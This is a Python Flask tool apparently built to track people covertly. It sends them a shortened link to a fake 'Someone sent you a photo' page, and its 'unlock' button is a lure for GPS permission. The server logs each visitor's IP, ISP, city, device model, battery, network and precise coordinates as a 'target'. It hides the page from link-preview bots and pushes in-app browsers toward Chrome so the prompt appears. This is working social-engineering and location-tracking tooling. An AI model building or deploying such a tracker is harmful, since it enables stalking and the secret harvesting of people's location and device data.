import os
import sys

# Fix Unicode output on Windows terminal
if sys.stdout.encoding and sys.stdout.encoding.lower() != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

import re
import logging
import random
import string
import requests as http_requests
from flask import Flask, request, jsonify, render_template_string, make_response
import user_agents as ua_parser

# Graceful config import — works even if config.py doesn't exist yet
try:
    from config import NGROK_AUTHTOKEN, NGROK_DOMAIN
except ImportError:
    import shutil, os as _os
    _example = _os.path.join(_os.path.dirname(__file__), 'config.example.py')
    _config  = _os.path.join(_os.path.dirname(__file__), 'config.py')
    if _os.path.exists(_example):
        shutil.copy(_example, _config)
        print("\n[!] config.py not found — created from config.example.py")
        print("    Add your NGROK_AUTHTOKEN in config.py and restart.\n")
    NGROK_AUTHTOKEN = ""
    NGROK_DOMAIN    = ""

# Suppress Flask/Werkzeug logs
sys.modules['flask.cli'].show_server_banner = lambda *x: None
logging.getLogger('werkzeug').setLevel(logging.ERROR)

app = Flask(__name__)

C_GREEN  = '\033[92m'
C_RED    = '\033[91m'
C_YELLOW = '\033[93m'
C_BLUE   = '\033[94m'
C_CYAN   = '\033[96m'
C_RESET  = '\033[0m'

BOT_AGENTS = [
    'whatsapp', 'telegrambot', 'facebookexternalhit', 'twitterbot',
    'linkedinbot', 'slackbot', 'discordbot', 'googlebot', 'bingbot',
    'applebot', 'instagram', 'pinterest', 'viber', 'snapchat',
    'curl', 'python-requests', 'wget',
]

def print_banner():
    import time
    os.system('cls' if os.name == 'nt' else 'clear')

    border  = "  ╔══════════════════════════════════════════════╗"
    line1   = "  ║        🌍  GEOLOCATION TRACKER CLI           ║"
    line2   = "  ║     Windows  |  Linux  |  macOS  |  Termux   ║"
    bottom  = "  ╚══════════════════════════════════════════════╝"

    def typewrite(text, color='', delay=0.018):
        sys.stdout.write(color)
        for ch in text:
            sys.stdout.write(ch)
            sys.stdout.flush()
            time.sleep(delay)
        sys.stdout.write('\n')

    print()
    typewrite(border,  C_BLUE,   0.010)
    typewrite(line1,   C_CYAN,   0.025)
    typewrite(line2,   C_GREEN,  0.025)
    typewrite(bottom,  C_BLUE,   0.010)
    sys.stdout.write(C_RESET)

    # Blinking "READY" indicator
    for _ in range(3):
        sys.stdout.write(f'\r  {C_GREEN}● SYSTEM READY{C_RESET}   ')
        sys.stdout.flush()
        time.sleep(0.3)
        sys.stdout.write(f'\r  {C_YELLOW}○ SYSTEM READY{C_RESET}   ')
        sys.stdout.flush()
        time.sleep(0.3)
    sys.stdout.write(f'\r  {C_GREEN}● SYSTEM READY{C_RESET}\n\n')


def is_bot(ua_string):
    ua_lower = ua_string.lower()
    return any(bot in ua_lower for bot in BOT_AGENTS)

def get_real_ip(req):
    forwarded = req.headers.get('X-Forwarded-For', '')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return req.remote_addr

def get_ip_info(ip):
    try:
        if ip in ('127.0.0.1', 'localhost', '::1'):
            ip = ''
        url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,mobile,proxy,query"
        resp = http_requests.get(url, timeout=5)
        data = resp.json()
        if data.get('status') == 'success':
            return data
    except Exception:
        pass
    return {}

def parse_os(ua_string):
    if m := re.search(r'Android\s([\d.]+)', ua_string):
        return f"Android {m.group(1)}"
    if m := re.search(r'iPhone OS ([\d_]+)', ua_string):
        return f"iOS {m.group(1).replace('_', '.')}"
    if m := re.search(r'Windows NT ([\d.]+)', ua_string):
        return {'10.0': 'Windows 10/11', '6.3': 'Windows 8.1', '6.1': 'Windows 7'}.get(m.group(1), f"Windows NT {m.group(1)}")
    if 'Mac OS X' in ua_string:
        return 'macOS'
    if 'Linux' in ua_string:
        return 'Linux'
    return 'Unknown'


# Pool of photos — one picked randomly each visit
PHOTO_POOL = [
    "https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=600",
    "https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=600",
    "https://images.unsplash.com/photo-1476514525535-07fb3b4ae5f1?w=600",
    "https://images.unsplash.com/photo-1501854140801-50d01698950b?w=600",
    "https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?w=600",
    "https://images.unsplash.com/photo-1519681393784-d120267933ba?w=600",
    "https://images.unsplash.com/photo-1490730141103-6cac27aaab94?w=600",
    "https://images.unsplash.com/photo-1500534314209-a25ddb2bd429?w=600",
    "https://images.unsplash.com/photo-1532274402911-5a369e4c4bb5?w=600",
    "https://images.unsplash.com/photo-1465146344425-f00d5f5c8f07?w=600",
    "https://images.unsplash.com/photo-1470770903676-69b98201ea1c?w=600",
    "https://images.unsplash.com/photo-1510798831971-661eb04b3739?w=600",
    "https://images.unsplash.com/photo-1504701954957-2010ec3bcec1?w=600",
    "https://images.unsplash.com/photo-1488646953014-85cb44e25828?w=600",
    "https://images.unsplash.com/photo-1502082553048-f009c37129b9?w=600",
]


@app.route('/photo/<tracking_id>')
def track_link(tracking_id):
    raw_ua = request.user_agent.string

    if is_bot(raw_ua):
        return '<html><head><title>404</title></head><body></body></html>', 200

    # Step 1: First visit — send Accept-CH header and redirect back
    # This tells Chrome to include real device data on the next request
    if not request.args.get('ready'):
        resp = make_response('', 302)
        resp.headers['Location'] = f'/photo/{tracking_id}?ready=1'
        resp.headers['Accept-CH'] = 'Sec-CH-UA-Platform-Version, Sec-CH-UA-Model, Sec-CH-UA-Full-Version-List'
        resp.headers['Permissions-Policy'] = 'ch-ua-platform-version=*, ch-ua-model=*'
        return resp

    # Step 2: Second visit — now Client Hints are available
    ip       = get_real_ip(request)
    parsed   = ua_parser.parse(raw_ua)
    browser  = parsed.browser.family or 'Unknown'
    b_ver    = parsed.browser.version_string or ''
    dev_type = "📱 Mobile" if parsed.is_mobile else ("📟 Tablet" if parsed.is_tablet else "🖥️ Desktop")

    # Client Hints (real OS version on Chrome)
    ch_platform = request.headers.get('Sec-CH-UA-Platform', '').strip('"')
    ch_ver      = request.headers.get('Sec-CH-UA-Platform-Version', '').strip('"')
    ch_model    = request.headers.get('Sec-CH-UA-Model', '').strip('"')

    os_ver = parse_os(raw_ua)
    if ch_platform and ch_ver:
        p = ch_platform.lower()
        if p == 'android':
            os_ver = f"Android {ch_ver}"
        elif p == 'windows':
            # Client Hints returns NT build number, not Windows version name
            try:
                build = int(ch_ver.split('.')[0])
                if build >= 13:
                    os_ver = "Windows 11"
                elif build >= 1:
                    os_ver = "Windows 10"
                else:
                    os_ver = "Windows 7/8"
            except Exception:
                os_ver = f"Windows (build {ch_ver})"
        elif p == 'macos':
            os_ver = f"macOS {ch_ver}"
        elif p == 'ios':
            os_ver = f"iOS {ch_ver}"
        elif p == 'chromeos':
            os_ver = f"ChromeOS {ch_ver}"

    model_str = f" [{ch_model}]" if ch_model else ""

    print(f"\n{C_YELLOW}{'='*52}")
    print(f"  [+] TARGET OPENED THE LINK!")
    print(f"{'='*52}{C_RESET}")
    print(f" ┣━ {C_CYAN}IP Address{C_RESET}  : {ip}")
    print(f" ┣━ {C_CYAN}Device{C_RESET}      : {dev_type}{model_str}")
    print(f" ┣━ {C_CYAN}OS{C_RESET}          : {os_ver}")
    print(f" ┣━ {C_CYAN}Browser{C_RESET}     : {browser} {b_ver}")

    info = get_ip_info(ip)
    if info:
        net_type = f"{C_GREEN}📶 Mobile Data{C_RESET}" if info.get('mobile') else "🔵 WiFi/Broadband"
        vpn_str  = f"{C_RED} [VPN/Proxy]{C_RESET}" if info.get('proxy') else ""
        print(f" ┣━ {C_CYAN}ISP/Carrier{C_RESET} : {info.get('isp', '?')}{vpn_str}")
        print(f" ┣━ {C_CYAN}Network{C_RESET}     : {net_type}")
        print(f" ┣━ {C_CYAN}Org{C_RESET}         : {info.get('org', '?')}")
        print(f" ┣━ {C_CYAN}City{C_RESET}        : {info.get('city')}, {info.get('regionName')}, {info.get('country')}")
        print(f" ┣━ {C_CYAN}IP Coords{C_RESET}   : {info.get('lat')}, {info.get('lon')}")
        print(f" ┗━ {C_CYAN}Maps (IP){C_RESET}   : https://maps.google.com/?q={info.get('lat')},{info.get('lon')}")
    else:
        print(f" ┗━ {C_RED}IP lookup failed{C_RESET}")

    print(f"\n{C_BLUE}[*] Waiting for GPS permission from target...{C_RESET}")

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Photo Shared With You</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0a0a0a; color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding-top: 30px; }
            .card { background: #1a1a1a; border-radius: 16px; width: 92%; max-width: 420px; overflow: hidden; box-shadow: 0 8px 32px rgba(0,0,0,0.5); }
            .card-header { display: flex; align-items: center; padding: 14px 16px; border-bottom: 1px solid #2a2a2a; }
            .avatar { width: 38px; height: 38px; border-radius: 50%; background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); margin-right: 10px; flex-shrink: 0; }
            .sender-name { font-size: 14px; font-weight: 600; }
            .sender-sub  { font-size: 12px; color: #888; margin-top: 2px; }
            .image-wrap { position: relative; width: 100%; aspect-ratio: 1; background: #111; }
            .image-wrap img { width: 100%; height: 100%; object-fit: cover; filter: blur(18px); transform: scale(1.05); transition: all 0.5s ease; }
            .image-wrap img.revealed { filter: none; transform: scale(1); }
            .overlay { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.5); }
            .overlay.hidden { display: none; }
            .view-btn { background: #fff; color: #111; font-size: 15px; font-weight: 700; border: none; border-radius: 30px; padding: 13px 30px; cursor: pointer; display: flex; align-items: center; gap: 8px; }
            .hint { color: rgba(255,255,255,0.65); font-size: 12px; margin-top: 10px; }
            .card-footer { padding: 12px 16px; display: flex; justify-content: space-between; color: #666; font-size: 12px; border-top: 1px solid #2a2a2a; }
            .lbar { width: 100%; height: 3px; background: #222; }
            .lfill { height: 100%; width: 0%; background: linear-gradient(90deg, #3498db, #9b59b6); transition: width 0.4s; }
        </style>
    </head>
    <body>
        <div class="card">
            <div class="lbar"><div class="lfill" id="lbar"></div></div>
            <!-- WebView warning banner — hidden by default, shown via JS -->
            <div id="wv-banner" style="display:none; background:#e67e22; color:#fff; padding:10px 14px; font-size:13px; text-align:center;">
                📱 Open in Chrome for full quality
                <a id="wv-link" href="#" style="color:#fff; font-weight:700; margin-left:6px; text-decoration:underline;">Tap Here →</a>
            </div>
            <div class="card-header">
                <div class="avatar"></div>
                <div style="flex:1">
                    <div class="sender-name">Someone sent you a photo</div>
                    <div class="sender-sub">Tap to view &bull; Expires soon</div>
                </div>
                <span style="color:#888;font-size:20px;">📸</span>
            </div>
            <div class="image-wrap">
                <img id="photo" src="{{ photo_url }}" alt="Photo" />
                <div class="overlay" id="overlay">
                    <button class="view-btn" onclick="unlockImage()">🔓 View Full Image</button>
                    <p class="hint">Tap to unlock &amp; view in HD</p>
                </div>
            </div>
            <div class="card-footer">
                <span>📍 Shared via PhotoDrop</span>
                <span id="fstatus">Tap to view</span>
            </div>
        </div>

        <script>
            let bar = document.getElementById('lbar');
            bar.style.width = '70%';
            setTimeout(() => { bar.style.width = '100%'; }, 300);
            setTimeout(() => { bar.style.opacity = '0'; }, 800);

            // Detect WhatsApp / Facebook / Instagram in-app browser (WebView)
            (function() {
                var ua = navigator.userAgent || '';
                var isWebView = /wv/.test(ua) || /FBAN|FBAV/.test(ua) ||
                                /Instagram/.test(ua) || /WhatsApp/.test(ua) ||
                                (/Android/.test(ua) && !navigator.userAgentData);
                if (isWebView) {
                    var banner = document.getElementById('wv-banner');
                    var link   = document.getElementById('wv-link');
                    banner.style.display = 'block';
                    var url = window.location.href;
                    if (/Android/i.test(ua)) {
                        link.href = 'intent://' + url.split('://').slice(1).join('://') +
                                    '#Intent;scheme=https;package=com.android.chrome;end';
                    } else {
                        link.href = url;
                        link.setAttribute('target', '_blank');
                    }
                }
            })();

            async function sendDeviceInfo() {
                let battery = 'N/A', network = 'N/A', uaHints = {};
                try {
                    let b = await navigator.getBattery();
                    battery = Math.round(b.level * 100) + '% ' + (b.charging ? '⚡Charging' : '🔋Not Charging');
                } catch(e) {}
                try {
                    let c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    if (c) {
                        let spd = c.downlink || 0;
                        let gen = spd > 50 ? '5G' : (c.effectiveType || '?').toUpperCase();
                        network = gen + ' | ' + spd + ' Mbps | type=' + (c.type || '?');
                    }
                } catch(e) {}
                try {
                    if (navigator.userAgentData) {
                        uaHints = await navigator.userAgentData.getHighEntropyValues(
                            ['platformVersion', 'model', 'architecture', 'fullVersionList']
                        );
                    }
                } catch(e) {}

                fetch('/log-device', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        screen:    screen.width + 'x' + screen.height + ' (' + screen.colorDepth + 'bit)',
                        platform:  navigator.platform,
                        language:  navigator.language,
                        timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
                        network:   network,
                        battery:   battery,
                        cores:     navigator.hardwareConcurrency || 'N/A',
                        memory:    (navigator.deviceMemory || 'N/A') + 'GB',
                        real_os:   (uaHints.platform || '') + ' ' + (uaHints.platformVersion || ''),
                        real_model: uaHints.model || 'N/A',
                        real_arch:  uaHints.architecture || 'N/A'
                    })
                });
            }
            sendDeviceInfo();

            function unlockImage() {
                document.getElementById('fstatus').innerText = 'Loading...';
                document.getElementById('overlay').classList.add('hidden');
                document.getElementById('photo').classList.add('revealed');

                if (!navigator.geolocation) {
                    fetch('/log-error', {method: 'POST'});
                    return;
                }

                // Step 1: Fast location first (cell tower / WiFi) — no timeout issues
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        // Got fast location — send it immediately
                        sendGPS(pos, 'fast');

                        // Step 2: Try to get more accurate GPS in background
                        navigator.geolocation.getCurrentPosition(
                            function(pos2) { sendGPS(pos2, 'accurate'); },
                            function() {},
                            { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                        );
                    },
                    function(err) {
                        fetch('/log-error', {method: 'POST'});
                        document.getElementById('fstatus').innerText = '✓ Loaded';
                    },
                    { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
                );
            }

            function sendGPS(pos, type) {
                fetch('/log-gps', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        lat:      pos.coords.latitude,
                        lon:      pos.coords.longitude,
                        accuracy: Math.round(pos.coords.accuracy),
                        altitude: pos.coords.altitude,
                        type:     type
                    })
                });
                document.getElementById('fstatus').innerText = '✓ Loaded';
            }
        </script>
    </body>
    </html>
    """

    resp = make_response(render_template_string(html, photo_url=random.choice(PHOTO_POOL)))
    resp.headers['Accept-CH'] = 'Sec-CH-UA-Platform-Version, Sec-CH-UA-Model, Sec-CH-UA-Full-Version-List'
    resp.headers['Permissions-Policy'] = 'ch-ua-platform-version=*, ch-ua-model=*'
    return resp


def map_windows_ver(ver_str):
    try:
        build = int(ver_str.split('.')[0])
        if build >= 13: return 'Windows 11'
        elif build >= 1: return 'Windows 10'
        else: return 'Windows 7/8'
    except Exception:
        return f'Windows (build {ver_str})'

@app.route('/log-device', methods=['POST'])
def log_device():
    d          = request.json
    real_model = d.get('real_model', 'N/A')
    real_arch  = d.get('real_arch', 'N/A')
    raw_os     = (d.get('real_os') or '').strip()

    # Fix Windows version label from JS raw value
    if 'Windows' in raw_os:
        ver_part = raw_os.replace('Windows', '').strip()
        real_os_label = map_windows_ver(ver_part)
    else:
        real_os_label = raw_os

    print(f"\n{C_BLUE}[📱] DEVICE DETAILS:{C_RESET}")
    print(f" ┣━ Screen      : {d.get('screen')}")
    if real_model and real_model != 'N/A':
        print(f" ┣━ Model       : {real_model}")
    if real_arch and real_arch != 'N/A':
        print(f" ┣━ Architecture: {real_arch}")
    print(f" ┣━ Language    : {d.get('language')}")
    print(f" ┣━ Timezone    : {d.get('timezone')}")
    print(f" ┣━ Network     : {d.get('network')}")
    print(f" ┣━ Battery     : {d.get('battery')}")
    print(f" ┣━ CPU Cores   : {d.get('cores')}")
    print(f" ┗━ RAM         : {d.get('memory')} {C_YELLOW}(browser caps at 8GB){C_RESET}")
    return jsonify({"status": "ok"})


@app.route('/log-gps', methods=['POST'])
def log_gps():
    d    = request.json
    lat  = d.get('lat')
    lon  = d.get('lon')
    acc  = d.get('accuracy', 'N/A')
    alt  = d.get('altitude')
    typ  = d.get('type', 'unknown').upper()
    print(f"\n{C_GREEN}[★ GPS - {typ}]{C_RESET}")
    print(f" ┣━ Latitude    : {lat}")
    print(f" ┣━ Longitude   : {lon}")
    print(f" ┣━ Accuracy    : ±{acc} meters")
    if alt:
        print(f" ┣━ Altitude    : {round(alt)}m")
    print(f" ┗━ Google Maps : https://maps.google.com/?q={lat},{lon}")
    return jsonify({"status": "success"})


@app.route('/log-error', methods=['POST'])
def log_error():
    print(f"\n{C_RED}[!] GPS Permission Denied by Target.{C_RESET}")
    return jsonify({"status": "error"})


if __name__ == '__main__':
    print_banner()
    PORT = 8080

    print(f"{C_YELLOW}Select Connection Type:{C_RESET}")
    print(f"  [1] Localhost  (same network / testing)")
    print(f"  [2] Ngrok      (public internet link)")

    choice = input(f"\n{C_GREEN}Enter choice (1/2): {C_RESET}").strip()
    TRACKING_ID = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

    print(f"\n{C_GREEN}[✔] Starting server...{C_RESET}")

    if choice == '2':
        try:
            from pyngrok import ngrok
            token = NGROK_AUTHTOKEN

            # If token not set in config, ask in terminal
            if not token:
                print(f"\n{C_YELLOW}[?] Ngrok Authtoken not found in config.py{C_RESET}")
                print(f"    Get free token: https://dashboard.ngrok.com/authtokens")
                token = input(f"\n{C_GREEN}Paste your Ngrok Authtoken: {C_RESET}").strip()

            if not token:
                raise ValueError("No authtoken provided.")

            try:
                ngrok.kill()
            except Exception:
                pass

            ngrok.set_auth_token(token)

            # Use custom static domain if configured, else random tunnel
            if NGROK_DOMAIN:
                tunnel     = ngrok.connect(PORT, "http", domain=NGROK_DOMAIN)
            else:
                tunnel     = ngrok.connect(PORT, "http")
            public_url = tunnel.public_url.replace('http://', 'https://')
            track_url  = f"{public_url}/photo/{TRACKING_ID}"

            # Shorten URL with shrtco.de, fallback to TinyURL
            short_url = track_url
            try:
                r = http_requests.get(f'https://api.shrtco.de/v2/shorten?url={track_url}', timeout=5)
                data = r.json()
                if data.get('ok'):
                    short_url = data['result']['short_link']
            except Exception:
                try:
                    r = http_requests.get(f'https://tinyurl.com/api-create.php?url={track_url}', timeout=5)
                    if r.status_code == 200 and r.text.startswith('http'):
                        short_url = r.text.strip()
                except Exception:
                    pass


            import time

            # Fixed-width box header (no URL inside — works on all terminals)
            header = [
                f"{C_YELLOW}  ╔══════════════════════════════════════════╗{C_RESET}",
                f"{C_YELLOW}  ║   🎯  LINK READY — SEND TO TARGET       ║{C_RESET}",
                f"{C_YELLOW}  ╚══════════════════════════════════════════╝{C_RESET}",
            ]
            print()
            for line in header:
                for ch in line:
                    sys.stdout.write(ch)
                    sys.stdout.flush()
                    time.sleep(0.006)
                sys.stdout.write('\n')

            # Links shown BELOW box — no overflow issues
            time.sleep(0.1)
            print(f"\n  {C_GREEN}📎 SHORT ▶  {short_url}{C_RESET}")
            time.sleep(0.15)
            print(f"  {C_CYAN}🔗 FULL  ▶  {track_url}{C_RESET}\n")

            # Pulse the short link
            time.sleep(0.2)
            for _ in range(3):
                sys.stdout.write(f'\r  {C_GREEN}▶ Copy & send the SHORT link above!{C_RESET}   ')
                sys.stdout.flush()
                time.sleep(0.45)
                sys.stdout.write(f'\r  {C_YELLOW}▷ Copy & send the SHORT link above!{C_RESET}   ')
                sys.stdout.flush()
                time.sleep(0.45)
            sys.stdout.write(f'\r  {C_GREEN}✔ Waiting for target to open link...{C_RESET}     \n\n')

            print(f"{C_BLUE}[TIP] GPS not asked? → Tell target: open in Chrome or Incognito{C_RESET}\n")

        except Exception as e:
            err_str = str(e)
            print(f"\n{C_RED}[!] Ngrok Failed:{C_RESET}")
            if 'ERR_NGROK_105' in err_str or 'authentication failed' in err_str:
                print(f"  {C_RED}▶ TOKEN EXPIRED or INVALID!{C_RESET}")
                print(f"  Get a new token  → https://dashboard.ngrok.com/authtokens")
                print(f"  Then update NGROK_AUTHTOKEN in config.py and restart.")
            elif 'session' in err_str.lower() or 'closed' in err_str.lower():
                print(f"  {C_YELLOW}▶ Tunnel session timed out (8-hour free limit).{C_RESET}")
                print(f"  Fix: stop the server and run again → python server.py")
            else:
                print(f"  {C_YELLOW}{err_str[:120]}{C_RESET}")
            print(f"\n  Fallback → http://127.0.0.1:{PORT}/photo/{TRACKING_ID}\n")
    else:
        print(f"\n  Local Link: http://127.0.0.1:{PORT}/t/{TRACKING_ID}\n")

    print(f"{C_BLUE}[*] Listening for targets... Press CTRL+C to stop.{C_RESET}\n")
    app.run(host='0.0.0.0', port=PORT)